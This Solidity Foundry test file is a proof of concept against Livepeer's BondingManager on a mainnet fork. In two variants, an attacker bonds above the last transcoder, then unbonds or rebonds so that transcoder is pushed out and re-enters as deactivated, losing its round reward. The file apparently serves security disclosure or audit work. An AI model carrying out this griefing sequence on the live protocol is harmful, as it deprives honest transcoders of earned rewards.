// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import { GovernorBaseTest } from "./base/GovernorBaseTest.sol";
import "forge-std/console.sol";

import "contracts/token/LivepeerToken.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address to, uint256 amount) external returns (bool);

    function balanceOf(address to) external returns (uint256);
}

interface IBondingManager {
    struct TranscoderData {
        uint256 lastRewardRound;
        uint256 rewardCut;
        uint256 feeShare;
        uint256 lastActiveStakeUpdateRound;
        uint256 activationRound;
        uint256 deactivationRound;
        uint256 activeCumulativeRewards;
        uint256 cumulativeRewards;
        uint256 cumulativeFees;
        uint256 lastFeeRound;
    }

    struct TranscoderEarningsPoolData {
        uint256 totalStake;
        uint256 transcoderRewardCut;
        uint256 transcoderFeeShare;
        uint256 cumulativeRewardFactor;
        uint256 cumulativeFeeFactor;
    }

    struct DelegatorData {
        uint256 bondedAmount;
        uint256 fees;
        address delegateAddress;
        uint256 delegatedAmount;
        uint256 startRound;
        uint256 lastClaimRound;
        uint256 nextUnbondingLockId;
    }

    function reward() external;

    function bond(uint256 _amount, address _to) external;

    function unbond(uint256 _amount) external;

    function rebond(uint256 _unbondingLockId) external;

    function transcoder(uint256 _rewardCut, uint256 _feeShare) external;

    function claimEarnings(uint256 _endRound) external;

    function getFirstTranscoderInPool() external view returns (address);

    function getNextTranscoderInPool(address _transcoder) external view returns (address);

    function getTranscoderEarningsPoolForRound(address _transcoder, uint256 _round)
        external
        view
        returns (TranscoderEarningsPoolData memory);

    function getTranscoder(address _transcoder) external view returns (TranscoderData memory);

    function getDelegator(address _delegator) external view returns (DelegatorData memory);
}

interface IRoundsManager {
    function roundLength() external returns (uint256);

    function currentRound() external view returns (uint256);

    function initializeRound() external;
}

// forge test --match-contract BondingManagerGriefLastTranscoderRewardPoc --fork-url https://arbitrum-mainnet.infura.io/v3/$INFURA_KEY -vvv
contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
    LivepeerToken public immutable lpt;
    address public immutable minter;
    IBondingManager public immutable bondingManager;
    IRoundsManager public immutable roundsManager;

    constructor() {
        lpt = LivepeerToken(getContract("LivepeerToken"));
        minter = getContract("Minter");
        bondingManager = IBondingManager(getContract("BondingManager"));
        roundsManager = IRoundsManager(getContract("RoundsManager"));
    }

    uint256 roundLength;

    function setUp() public {
        vm.rollFork(290482185);
        roundLength = roundsManager.roundLength();
    }

    function _skipToNextRound() internal {
        vm.roll(block.number + roundLength);
        roundsManager.initializeRound();

        console.log("\n---------------------- ROUND = %s ----------------------", roundsManager.currentRound());
    }

    function _getDelegatorData(address del) internal view returns (IBondingManager.DelegatorData memory) {
        return bondingManager.getDelegator(del);
    }

    function _getTransoderEarningPoolData(address del, uint256 round)
        internal
        view
        returns (IBondingManager.TranscoderEarningsPoolData memory)
    {
        return bondingManager.getTranscoderEarningsPoolForRound(del, round);
    }

    function _getTranscoderData(address del) internal view returns (IBondingManager.TranscoderData memory) {
        return bondingManager.getTranscoder(del);
    }

    function _getLastTranscoder() internal view returns (address lastTranscoder) {
        lastTranscoder = bondingManager.getFirstTranscoderInPool();
        for (uint256 i = 1; i < 100; ++i) {
            lastTranscoder = bondingManager.getNextTranscoderInPool(lastTranscoder);
        }
    }

    function testPoc() public {
        address hacker = newAddr();
        address lastTranscoder = _getLastTranscoder();

        /// attacker need 450 + 2 lpt to execute the attack
        vm.prank(minter);
        lpt.mint(hacker, 450 * 1e18 + 2);

        /// ---------------------- ROUND = 45816 ----------------------
        _skipToNextRound();

        /// attacker bond for themself to make their status in the next round become "Bonded"
        vm.startPrank(hacker);
        lpt.approve(address(bondingManager), type(uint256).max);
        bondingManager.bond(1, hacker);
        vm.stopPrank();

        /// ---------------------- ROUND = 45817 ----------------------
        _skipToNextRound();

        /// attacker bond more than the last transcoder and kick them out of the `transcoderPool`
        vm.startPrank(hacker);
        bondingManager.bond(450 * 1e18, hacker);
        assertEq(hacker, _getLastTranscoder());

        /// attacker unbond all to make the `transcoderPool` not full
        bondingManager.unbond(_getDelegatorData(hacker).bondedAmount);

        /// the `lastTranscoder` is added into the `transcoderPool` again and become deactivated.
        bondingManager.bond(1, lastTranscoder);
        vm.stopPrank();

        assertEq(_getTranscoderData(lastTranscoder).activationRound, roundsManager.currentRound() + 1);

        /// the `lastTranscoder` is unable to claim the reward for ROUND = 3640 because it's considered as inactivate
        vm.expectRevert(bytes("caller must be an active transcoder"));
        vm.prank(lastTranscoder);
        bondingManager.reward();
        console.log(_getTranscoderData(lastTranscoder).deactivationRound);

        /// Note that the attacker can still withdraw all the fund they use for the attack at the withdrawRound
    }

    function testPocRebond() public {
        // attacker needs two accounts for the attack
        address hacker = newAddr();
        address hackerForRebond = newAddr();
        address lastTranscoder = _getLastTranscoder();

        /// attacker needs 450 + 3 lpt to execute the attack
        vm.startPrank(minter);
        lpt.mint(hacker, 450 * 1e18 + 1);
        lpt.mint(hackerForRebond, 2);
        vm.stopPrank();

        /// ---------------------- ROUND = 45816 ----------------------
        _skipToNextRound();

        // attacker bonds to the last transcoder and immediately unbonds
        vm.startPrank(hackerForRebond);
        lpt.approve(address(bondingManager), type(uint256).max);
        bondingManager.bond(2, lastTranscoder);
        vm.stopPrank();

        /// attacker bond for themself to make their status in the next round become "Bonded"
        vm.startPrank(hacker);
        lpt.approve(address(bondingManager), type(uint256).max);
        bondingManager.bond(1, hacker);
        vm.stopPrank();

        /// ---------------------- ROUND = 45817 ----------------------
        _skipToNextRound();

        /// attacker bond more than the last transcoder and kick them out of the `transcoderPool`
        vm.startPrank(hacker);
        bondingManager.bond(450 * 1e18, hacker);
        assertEq(hacker, _getLastTranscoder());

        /// attacker unbond all to make the `transcoderPool` not full
        bondingManager.unbond(_getDelegatorData(hacker).bondedAmount);
        vm.stopPrank();

        // attacker unbonds and rebonds the last transcoder,
        // the `lastTranscoder` is added into the `transcoderPool` again and become deactivated.
        uint256 unbondingLockId = _getDelegatorData(hackerForRebond).nextUnbondingLockId;
        vm.startPrank(hackerForRebond);
        bondingManager.unbond(1);
        bondingManager.rebond(unbondingLockId);
        vm.stopPrank();

        assertEq(_getTranscoderData(lastTranscoder).activationRound, roundsManager.currentRound() + 1);

        /// the `lastTranscoder` is unable to claim the reward for ROUND = 3640 because it's considered as inactivate
        vm.expectRevert(bytes("caller must be an active transcoder"));
        vm.prank(lastTranscoder);
        bondingManager.reward();
        console.log(_getTranscoderData(lastTranscoder).deactivationRound);

        /// Note that the attacker can still withdraw all the fund they use for the attack at the withdrawRound
    }

    receive() external payable {}
}
